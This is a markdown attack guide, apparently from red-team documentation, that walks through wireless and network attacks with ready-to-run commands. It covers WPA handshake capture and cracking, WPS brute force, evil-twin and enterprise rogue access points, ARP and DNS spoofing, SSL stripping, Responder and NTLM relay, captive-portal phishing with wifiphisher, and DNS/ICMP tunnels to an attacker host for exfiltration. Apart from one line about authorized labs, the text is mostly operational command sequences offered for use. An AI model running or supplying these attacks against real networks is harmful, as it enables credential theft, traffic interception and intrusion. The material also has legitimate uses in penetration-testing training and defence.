---
icon: axe-battle
---

# Wireless & Network Attacks

## **Wireless & Network Attacks — Dominating the Airwaves and the Wire**

***

The network layer is the nervous system of every target.\
Controlling traffic means controlling data, identities, and access.\
This guide turns you into a **network predator**: performing packet interception, Wi-Fi exploitation, and advanced man-in-the-middle attacks.

***

### I. 🧩 Core Concepts

| Concept              | Description                                                        |
| -------------------- | ------------------------------------------------------------------ |
| **802.11**           | Standard defining wireless LAN communications.                     |
| **BSSID / ESSID**    | AP MAC address / network name.                                     |
| **Handshake**        | 4-way WPA/WPA2 authentication exchange.                            |
| **Deauthentication** | Frame used to disconnect clients (used for attacks).               |
| **MITM**             | Manipulating or relaying communication between victim and gateway. |

***

### II. ⚙️ Reconnaissance and Scanning

#### 🧠 Network Discovery

```bash
sudo nmap -sn 10.10.0.0/24
```

#### 🧩 Wi-Fi Enumeration

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

#### ⚙️ Identify Targets

Focus on:

* Weak encryption (WEP/WPA)
* Hidden SSIDs
* High client count networks

***

### III. 💣 Wireless Cracking Attacks

#### 🧠 Capturing WPA Handshakes

```bash
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write capture wlan0mon
```

#### ⚙️ Deauth to Force Handshake

```bash
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

#### 💣 Crack with Wordlist

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture.cap
```

***

### IV. 🧠 WPS Attacks

#### ⚙️ Bruteforce with Reaver

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

#### 💣 Pixie Dust Attack

Exploit weak WPS pin generation:

```bash
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -v 3
```

***

### V. ⚙️ Evil Twin & Rogue AP Attacks

#### 🧩 Setup Rogue AP

```bash
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon
```

#### ⚙️ Enable Routing

```bash
sudo ifconfig at0 10.0.0.1/24 up
sudo service apache2 start
sudo sysctl -w net.ipv4.ip_forward=1
```

#### 💣 NAT Forwarding

```bash
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

Result → Victims connect to your fake AP, and you control all traffic.

***

### VI. 🧠 WPA Enterprise Attacks (EAP / RADIUS)

Use **hostapd-wpe** to impersonate enterprise APs and harvest credentials.

```bash
sudo hostapd-wpe hostapd-wpe.conf
```

Captured hashes appear in:

```
/var/lib/hostapd-wpe/
```

Crack with:

```bash
asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt
```

***

### VII. ⚙️ Packet Capture & Analysis

#### 🧩 Capture Live Traffic

```bash
sudo tcpdump -i wlan0mon -w traffic.cap
```

#### ⚙️ Analyze with Wireshark

Filters:

```
http.request
tcp.flags.syn==1
icmp
dns
```

#### 💣 Identify Credentials

Look for:

```
Authorization:
Cookie:
GET /login
```

***

### VIII. 💀 Man-in-the-Middle (MITM) Attacks

#### 🧠 ARP Spoofing

```bash
sudo arpspoof -i eth0 -t 10.10.0.5 10.10.0.1
```

#### ⚙️ Enable Forwarding

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

#### 💣 Capture Traffic

```bash
sudo mitmproxy -p 8080
```

***

### IX. 🧠 DNS Spoofing

#### ⚙️ Ettercap Example

```bash
sudo ettercap -T -q -i eth0 -M arp:remote /10.10.0.1/ /10.10.0.5/
```

Edit `/etc/ettercap/etter.dns`:

```
target.com  A 10.10.14.2
```

Victim now resolves your attacker IP.

***

### X. ⚙️ SSL Stripping

Downgrade HTTPS → HTTP and capture credentials.

```bash
sudo sslstrip -l 8080
```

Combine with iptables redirect:

```bash
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```

***

### XI. ⚙️ DHCP Starvation & Rogue Server

Exhaust DHCP pool to force clients onto attacker’s network.

```bash
yersinia dhcp -attack 1
```

Setup rogue DHCP:

```bash
sudo dhcpd -cf /etc/dhcp/dhcpd.conf at0
```

***

### XII. 🧠 Sniffing and Credential Harvesting

| Protocol        | Tool                  | Example             |
| --------------- | --------------------- | ------------------- |
| **HTTP**        | Wireshark / mitmproxy | `GET /login`        |
| **FTP**         | Wireshark / tcpdump   | Capture plain creds |
| **SMB**         | Responder             | NTLM hash relay     |
| **IMAP / POP3** | Wireshark             | Capture email creds |

***

### XIII. ⚙️ Responder & NTLM Relay Attacks

#### 🧩 Poison LLMNR/NBT-NS

```bash
sudo responder -I eth0 -wrf
```

Captured NTLMv2 hashes appear in:

```
/usr/share/responder/logs/
```

Crack with:

```bash
hashcat -m 5600 hash.txt rockyou.txt
```

***

### XIV. 💣 SMB Relay (Windows Targets)

```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
```

Use in combination with Responder to relay SMB auths → remote code execution.

***

### XV. ⚙️ Wi-Fi Credential Harvesting Portal

Automate captive-portal phishing:

```bash
git clone https://github.com/sophron/wifiphisher
sudo wifiphisher -aI wlan0mon -e "CafeFreeWiFi"
```

Victims receive a fake login page → captured credentials logged to console.

***

### XVI. ⚙️ Traffic Tunneling & Exfiltration

#### 🧩 SSH Tunnel

```bash
ssh -D 1080 user@10.10.14.2
proxychains firefox
```

#### 💣 ICMP Tunnel

```bash
sudo icmptunnel 10.10.14.2
```

#### ⚙️ DNS Tunnel

```bash
iodine -f attacker.com 10.10.14.2
```

***

### XVII. 🧠 Network Pivoting

Once inside a network, pivot to internal systems.

#### ⚙️ With Proxychains + SSH

```bash
ssh -D 9050 user@pivot
proxychains nmap -sT -Pn 10.0.0.0/24
```

#### 💣 With Chisel

```bash
./chisel server -p 8000 --reverse
./chisel client 10.10.14.2:8000 R:1080:socks
```

***

### XVIII. ⚙️ De-Anonymization & Tracking Defense

| Threat                 | Defense                                  |
| ---------------------- | ---------------------------------------- |
| MAC tracking           | Randomize MAC: `macchanger -r wlan0`     |
| Probe sniffing         | Disable auto-connect                     |
| DNS leak               | Use encrypted DNS or VPN                 |
| Network fingerprinting | Use Tor or VPN over different exit nodes |

***

### XIX. ⚔️ Pro Tips & Red Team Tricks

✅ **Automation**

* Chain `airmon-ng`, `airodump-ng`, and `aireplay-ng` in scripts.
* Automate WPA handshake collection + cracking.

✅ **Stealth**

* Reduce TX power: `iwconfig wlan0 txpower 5`.
* Randomize MAC before every engagement.

✅ **Pivoting**

* Combine Wi-Fi attacks with `socat` tunnels to move laterally.

✅ **Reporting**

* Always capture `.cap` files for later evidence or cracking.

✅ **Legal Boundaries**

* Perform attacks only on authorized labs or CTF environments.

***

### XX. ⚙️ Quick Reference Table

| Category          | Tool                 | Command                 |
| ----------------- | -------------------- | ----------------------- |
| Recon             | airodump-ng          | `airodump-ng wlan0mon`  |
| Handshake Capture | aireplay-ng          | `--deauth 10`           |
| Crack             | aircrack-ng          | `-w rockyou.txt`        |
| MITM              | arpspoof / mitmproxy | `-t <target> <gateway>` |
| DNS Poison        | ettercap             | `-M arp:remote`         |
| SSL Strip         | sslstrip             | `-l 8080`               |
| Rogue AP          | airbase-ng           | `-e FreeWiFi -c 6`      |
| Phishing Portal   | wifiphisher          | `-e CafeFreeWiFi`       |
| NTLM Relay        | impacket-ntlmrelayx  | `-tf targets.txt`       |

***
